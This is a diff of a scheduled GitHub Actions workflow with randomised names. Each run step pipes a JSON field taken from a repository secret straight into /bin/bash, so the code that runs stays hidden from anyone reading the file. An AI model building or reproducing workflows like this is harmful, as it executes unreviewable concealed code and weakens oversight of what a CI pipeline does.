@@ -2,22 +2,24 @@ name: nongfeiting1524
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
-jobs:  # 21915
+    - cron: '19 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nongfeiting1524
         env:
-          xnhmm1143: ${{ secrets.xnhmm1143 }}
+          y820: ${{ secrets.y820 }}
         run: |
-          echo $xnhmm1143 | jq -r .i18 | /bin/bash
-          echo $wwq703 | jq -r .jwo555 | /bin/bash
-          echo $pbd64135 | jq -r .pq54452 | /bin/bash
-          echo $mgrfs2 | jq -r .ynp2136 | /bin/bash
-          echo $jjlwv3417 | jq -r .lfqx676 | /bin/bash
-          echo $zunjw2 | jq -r .bsyng3 | /bin/bash
-          echo $p93 | jq -r .os1 | /bin/bash
+          echo $y820 | jq -r .op55 | /bin/bash
+          echo $zh26844 | jq -r .jyv166 | /bin/bash
+          echo $tevq4958 | jq -r .yoqz583 | /bin/bash
+          echo $ji40827 | jq -r .iebe50174 | /bin/bash
+          echo $t5 | jq -r .gjnky2848 | /bin/bash
+          echo $lz6199 | jq -r .k6 | /bin/bash
+          echo $npaav8 | jq -r .ehwk24 | /bin/bash
+          echo $cugzg62 | jq -r .ueh67139 | /bin/bash
+          echo $gk8893 | jq -r .byoj68 | /bin/bash
+          echo $pghpo27 | jq -r .xtk8359 | /bin/bash
 
